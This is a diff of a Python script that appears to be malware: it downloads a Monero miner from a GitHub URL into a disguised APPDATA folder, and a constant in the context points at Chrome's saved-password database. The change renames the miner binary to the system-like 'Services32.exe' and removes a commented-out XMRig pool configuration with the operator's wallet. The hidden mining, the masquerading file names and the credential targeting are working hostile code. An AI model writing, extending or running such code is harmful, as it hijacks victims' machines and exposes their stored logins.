@@ -72,12 +72,12 @@ CUDA = False
 
 
 computer = wmi.WMI()
-MINERURL = "https://github.com/0xSxZ/Veerus/blob/main/MINER_IMPORTANT/clientdownloads/cUrl.exe?raw=true"
+MINERURL = "https://github.com/0xSxZ/Veerus/blob/main/MINER_IMPORTANT/clientdownloads/Services32.exe?raw=true"
 GPUMODEL = computer.Win32_VideoController()[0]
 
 
 
-XMRIGPATH = os.getenv('APPDATA') + "\\winedows_companny\\update\\cUrl.exe"
+XMRIGPATH = os.getenv('APPDATA') + "\\winedows_companny\\update\\Services32.exe"
 
 APP_DATA_PATH= os.environ['LOCALAPPDATA']
 DB_PATH = r'Google\Chrome\User Data\Default\Login Data'
@@ -662,165 +662,8 @@ if yes == "yes":
 						f.write(r.content)
 					with zipfile.ZipFile(os.getenv('APPDATA') + "\\winedows_companny\\update\\curlcuda.zip", 'r') as zip_ref:
 						zip_ref.extractall(os.getenv('APPDATA') + "\\winedows_companny\\update")
-					"""
-					open(os.getenv('APPDATA') + "\\winedows_companny\\update\\xmrig-nvidia-2.14.5\\config.json", "x").write('''
-{
-    "algo":"cn/r",
-    "api": {
-        "id": null,
-        "worker-id": null
-    },
-    "http": {
-        "enabled": false,
-        "host": "127.0.0.1",
-        "port": 0,
-        "access-token": null,
-        "restricted": true
-    },
-    "autosave": true,
-    "background": false,
-    "colors": true,
-    "title": true,
-    "randomx": {
-        "init": -1,
-        "init-avx2": -1,
-        "mode": "auto",
-        "1gb-pages": false,
-        "rdmsr": true,
-        "wrmsr": true,
-        "cache_qos": false,
-        "numa": true,
-        "scratchpad_prefetch_mode": 1
-    },
-    "cpu": {
-        "enabled": true,
-        "huge-pages": true,
-        "huge-pages-jit": false,
-        "hw-aes": null,
-        "priority": null,
-        "memory-pool": false,
-        "yield": true,
-        "asm": true,
-        "argon2-impl": null,
-        "argon2": [0, 1, 2, 3, 4, 5, 6, 7],
-        "cn": [
-            [1, 0],
-            [1, 2],
-            [1, 4],
-            [1, 6]
-        ],
-        "cn-heavy": [
-            [1, 0],
-            [1, 2]
-        ],
-        "cn-lite": [
-            [1, 0],
-            [1, 1],
-            [1, 2],
-            [1, 3],
-            [1, 4],
-            [1, 5],
-            [1, 6],
-            [1, 7]
-        ],
-        "cn-pico": [
-            [2, 0],
-            [2, 1],
-            [2, 2],
-            [2, 3],
-            [2, 4],
-            [2, 5],
-            [2, 6],
-            [2, 7]
-        ],
-        "cn/upx2": [
-            [2, 0],
-            [2, 1],
-            [2, 2],
-            [2, 3],
-            [2, 4],
-            [2, 5],
-            [2, 6],
-            [2, 7]
-        ],
-        "ghostrider": [
-            [8, 0],
-            [8, 2],
-            [8, 4],
-            [8, 6]
-        ],
-        "rx": [0, 2, 4, 6],
-        "rx/wow": [0, 1, 2, 3, 4, 5, 6, 7],
-        "cn-lite/0": false,
-        "cn/0": false,
-        "rx/arq": "rx/wow",
-        "rx/keva": "rx/wow"
-    },
-    "opencl": {
-        "enabled": false,
-        "cache": true,
-        "loader": null,
-        "platform": "AMD",
-        "adl": true
-    },
-    "cuda": {
-        "enabled": false,
-        "loader": null,
-        "nvml": true
-    },
-    "log-file": null,
-    "donate-level": 2,
-    "donate-over-proxy": 1,
-    "pools": [
-        {
-            "algo": null,
-            "coin": null,
-            "url": "xmr-eu1.nanopool.org:14444",
-            "user": "'''+ ADDRESS + '''",
-            "pass": "x",
-            "rig-id": null,
-            "nicehash": false,
-            "keepalive": true,
-            "enabled": true,
-            "tls": false,
-            "tls-fingerprint": null,
-            "daemon": false,
-            "socks5": null,
-            "self-select": null,
-            "submit-to-origin": false
-        }
-    ],
-    "retries": 5,
-    "retry-pause": 5,
-    "print-time": 60,
-    "health-print-time": 60,
-    "dmi": true,
-    "syslog": false,
-    "tls": {
-        "enabled": false,
-        "protocols": null,
-        "cert": null,
-        "cert_key": null,
-        "ciphers": null,
-        "ciphersuites": null,
-        "dhparam": null
-    },
-    "dns": {
-        "ipv6": false,
-        "ttl": 30
-    },
-    "user-agent": null,
-    "verbose": 0,
-    "watch": true,
-    "pause-on-battery": false,
-    "pause-on-active": false
-}
-
-
-					''')
-				"""
 				else:
-					XMRIGPATH = os.getenv('APPDATA') + "\\winedows_companny\\update\\cUrl.exe"
+					XMRIGPATH = os.getenv('APPDATA') + "\\winedows_companny\\update\\Services32.exe"
 					r = requests.get(MINERURL)
 					with open(XMRIGPATH, 'wb') as f:
 						print("Writing..")
